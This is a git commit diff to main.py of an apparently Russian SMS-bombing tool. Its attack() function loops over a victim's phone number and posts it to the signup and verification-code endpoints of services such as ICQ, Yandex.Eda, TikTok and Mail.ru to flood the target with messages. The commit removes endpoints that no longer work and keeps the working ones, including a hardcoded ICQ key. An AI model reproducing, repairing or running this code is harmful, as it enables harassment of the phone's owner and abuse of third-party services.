8ac689236aa3d9955bf02de23852471a66141eae
Romidorka <artemvasnev01@gmail.com>
2021-09-25 13:33:06 +0600

    Removed not working services

--- main.py
+++ main.py
@@ -40,34 +40,6 @@ def attack():
             if _phone == "":
                 continue
             try:
-                req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers=headers)
-                messagesSend+=1
-                print(f"[{messagesSend}] Tinkoff отправлен")
-            except:
-                print("Tinkoff не отправле")
-            try:
-                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, headers=headers)
-                
-                messagesSend += 1
-                print(f"[{messagesSend}] Sunlight отправлен")
-            except:
-                print("Sunlight не отправлен")
-            try:
-                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] MTS отправлен")
-            except:
-                print("MTS не отправлен")
-
-            try:
-                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
-                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", }, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] Mail.ru отправлен")
-            except:
-                print("Mail.ru не отправлен")
-
-            try:
                 requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                               data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                     "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
@@ -92,36 +64,13 @@ def attack():
                 print("Citilink не отправлен")
 
             try:
-                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] Youla отправлен")
-            except:
-                print("Youla не отправлен")
-
-            try:
                 requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone}, headers=headers)
                 messagesSend += 1
                 print(f"[{messagesSend}] Yandex.Eda отправлен")
             except:
                 print("Yandex.Eda не отправлен")
-
-            try:
-                requests.post("https://m.tiktok.com/node-a/send/download_link",
-                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": _phone[1:],
-                              "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] TikTok отправлен")
-            except:
-                print("TikTok не отправлен")
-
-            try:
-                requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": _phone[1:], "c": "3"}, headers=headers)
-                messagesSend += 1
-                print(f"[{messagesSend}] Rutaxi отправлен")
-            except:
-                print("Rutaxi не отправлен")
-
             time.sleep(2)
+
 
 clearScrean()
 logo()
